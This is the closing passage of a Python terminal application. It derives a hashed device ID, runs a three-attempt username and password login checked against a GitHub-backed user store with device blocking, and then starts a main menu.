                return hashlib.sha256(f.read().strip().encode()).hexdigest()[:32]
        except:
            pass
    try:
        import uuid
        return hashlib.sha256(str(uuid.getnode()).encode()).hexdigest()[:32]
    except:
        pass
    hostname = platform.node()
    username = os.getlogin() if hasattr(os, 'getlogin') else 'unknown'
    return hashlib.sha256(f"{hostname}_{username}_{time.time()}".encode()).hexdigest()[:32]

# ==================== LOGIN SCREEN ====================
async def login_screen():
    # FIRST CHECK: Apakah device sudah diblokir?
    if is_device_permanently_blocked():
        block_device_and_exit()
    
    db = GitHubDatabase()
    um = UserManager(db)
    dm = DeviceManager(db)
    device_id = get_device_id()
    
    attempts = 0
    while attempts < 3:
        os.system("clear" if os.name == "posix" else "cls")
        print(ASCII_ART)
        print(f"\n{Colors.CYAN}{'═' * 60}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.YELLOW}▢ LOGIN{Colors.RESET}")
        print(f"{Colors.CYAN}{'═' * 60}{Colors.RESET}\n")
        
        # Check if device blocked (dari GitHub)
        blocked, msg = await dm.is_blocked(device_id)
        if blocked:
            block_device_and_exit()
        
        username = input(f"{Colors.GREEN}Username: {Colors.RESET}")
        password = input(f"{Colors.GREEN}Password: {Colors.RESET}")
        
        verified, user_data = await um.verify_user(username, password, device_id)
        
        if verified:
            await dm.reset_attempts(device_id)
            print(f"\n{Colors.GREEN}✅ Welcome back, {username}!{Colors.RESET}")
            await asyncio.sleep(1)
            await db.close()
            return username, user_data.get("role", "user"), device_id
        else:
            attempts += 1
            blocked, msg = await dm.record_failed(device_id, username)
            print(f"\n{Colors.RED}❌ Login Failed!{Colors.RESET}")
            if blocked:
                # Device will be blocked and exit
                block_device_and_exit()
            print(f"{Colors.YELLOW}⚠️ {3 - attempts} attempts remaining{Colors.RESET}")
            await asyncio.sleep(1)
    
    # 3 attempts failed - block device
    block_device_and_exit()
    return None, None, None

# ==================== MAIN ====================
async def main():
    try:
        # First check before anything
        if is_device_permanently_blocked():
            block_device_and_exit()
        
        username, role, device_id = await login_screen()
        if username:
            menu = MainMenu(username, role, device_id)
            await menu.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}⚠️ Stopped{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}❌ Error: {e}{Colors.RESET}")

if __name__ == "__main__":
    asyncio.run(main())
